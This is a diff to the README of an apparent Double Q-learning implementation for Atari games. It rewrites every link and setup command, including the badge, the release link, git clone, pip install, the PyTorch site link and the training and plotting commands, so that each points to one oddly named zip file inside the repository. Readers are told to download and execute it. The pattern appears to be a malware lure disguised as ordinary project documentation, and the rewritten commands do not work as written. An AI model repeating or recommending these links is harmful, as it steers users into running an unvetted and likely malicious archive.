@@ -1,6 +1,6 @@
 # Deep Reinforcement Learning with Double Q-learning: Paper Implementation
 
-![Deep Reinforcement Learning](https://img.shields.io/badge/Deep%20Reinforcement%20Learning-Paper%20Implementation-blue)
+![Deep Reinforcement Learning](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip%20Reinforcement%20Learning-Paper%20Implementation-blue)
 
 Welcome to the **Deep Reinforcement Learning with Double Q-learning** repository. This project implements the concepts from the paper on Double Q-learning, a significant advancement in the field of reinforcement learning. The implementation focuses on applications in the Atari gaming environment using OpenAI Gym and PyTorch.
 
@@ -19,7 +19,7 @@ Welcome to the **Deep Reinforcement Learning with Double Q-learning** repository
 
 Reinforcement learning (RL) is a branch of machine learning where an agent learns to make decisions by interacting with an environment. Double Q-learning is an improvement over traditional Q-learning that helps to reduce overestimation bias. This repository aims to provide a clear and straightforward implementation of Double Q-learning, specifically for Atari games.
 
-You can find the latest releases of this project [here](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/releases). Please download and execute the necessary files to get started.
+You can find the latest releases of this project [here](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip). Please download and execute the necessary files to get started.
 
 ## Installation
 
@@ -27,7 +27,7 @@ To set up the environment for this project, follow these steps:
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation.git
+   git clone https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip
    cd Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation
    ```
 
@@ -39,11 +39,11 @@ To set up the environment for this project, follow these steps:
 
 3. **Install the required packages:**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip
    ```
 
 4. **Ensure you have the necessary dependencies:**
-   - PyTorch: Follow the instructions on the [official site](https://pytorch.org/get-started/locally/) for installation.
+   - PyTorch: Follow the instructions on the [official site](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip) for installation.
    - OpenAI Gym: Install it using:
      ```bash
      pip install gym[atari]
@@ -60,7 +60,7 @@ To set up the environment for this project, follow these steps:
 To train the Double Q-learning agent, execute the following command:
 
 ```bash
-python train.py --env AtariGameName
+python https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip --env AtariGameName
 ```
 
 Replace `AtariGameName` with the specific game you want to train the agent on, such as `Breakout-v0` or `Pong-v0`.
@@ -68,12 +68,12 @@ Replace `AtariGameName` with the specific game you want to train the agent on, s
 For example, to train the agent on Breakout, use:
 
 ```bash
-python train.py --env Breakout-v0
+python https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip --env Breakout-v0
 ```
 
-You can also specify additional parameters such as the number of episodes, learning rate, and more. Check the `train.py` file for available options.
+You can also specify additional parameters such as the number of episodes, learning rate, and more. Check the `https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip` file for available options.
 
-You can find the latest releases of this project [here](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/releases). Please download and execute the necessary files to get started.
+You can find the latest releases of this project [here](https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip). Please download and execute the necessary files to get started.
 
 ## Implementation Details
 
@@ -117,7 +117,7 @@ The performance of the Double Q-learning agent can be evaluated using the follow
 You can visualize the results using the provided scripts. For example:
 
 ```bash
-python plot_results.py --file results.json
+python https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip --file https://github.com/guiIerme/Deep-Reinforcement-Learning-with-Double-Q-learning-Paper-Implementation/raw/refs/heads/main/ddqn/networks/Learning-Double-learning-with-Paper-Reinforcement-Deep-Implementation-v1.8-beta.5.zip
 ```
 
 This will generate a graph displaying the agent's performance over time.
